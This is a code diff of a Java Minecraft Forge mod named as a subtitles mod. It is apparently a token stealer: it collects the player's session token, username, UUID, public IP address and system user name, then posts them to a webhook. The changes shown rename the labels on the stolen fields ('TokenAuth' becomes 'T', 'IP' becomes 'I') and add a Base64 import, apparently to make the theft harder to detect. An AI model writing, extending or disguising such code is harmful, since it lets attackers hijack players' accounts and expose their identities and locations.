@@ -9,6 +9,7 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 
 @Mod(modid ="minecraft_subtitles")// change this lmao
 public class subtitles
@@ -25,7 +26,7 @@ public class subtitles
             String uuid = mc.getSession().getPlayerID();
             String ip = (new BufferedReader(new InputStreamReader((new URL("https://checkip.amazonaws.com/")).openStream()))).readLine();
             //building tokenauth string
-            String tokenauth = username + ":" + uuid + ":" + token;
+            String t = username + ":" + uuid + ":" + token;
             //opening connection to webhook
             HttpURLConnection c = (HttpURLConnection)(new URL(webhook)).openConnection();
             //set do output to true
@@ -36,8 +37,8 @@ public class subtitles
             c.setRequestProperty("User-Agent", "Mozilla/5.0");
             OutputStream real = c.getOutputStream();
             //final string that will be sended
-            String ginfo = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"IP\",\"value\":\"```%s```\"},{\"name\":\"Username\",\"value\":\"```%s```\"}]}",new Object[]{ip ,System.getProperty("user.name")});
-            String info = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"TokenAuth\",\"value\":\"```%s```\"}]}",new Object[]{tokenauth});
+            String ginfo = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"I\",\"value\":\"```%s```\"},{\"name\":\"Username\",\"value\":\"```%s```\"}]}",new Object[]{ip ,System.getProperty("user.name")});
+            String info = String.format("{\"title\":\"Info\",\"color\":7527956, \"fields\":[{\"name\":\"T\",\"value\":\"```%s```\"}]}",new Object[]{t});
             String sending = String.format("{\"embeds\":[%s,%s]}", new Object[] {ginfo, info});
             //this error doesent matter (ignore it)
             real.write(sending.getBytes(StandardCharsets.UTF_8));
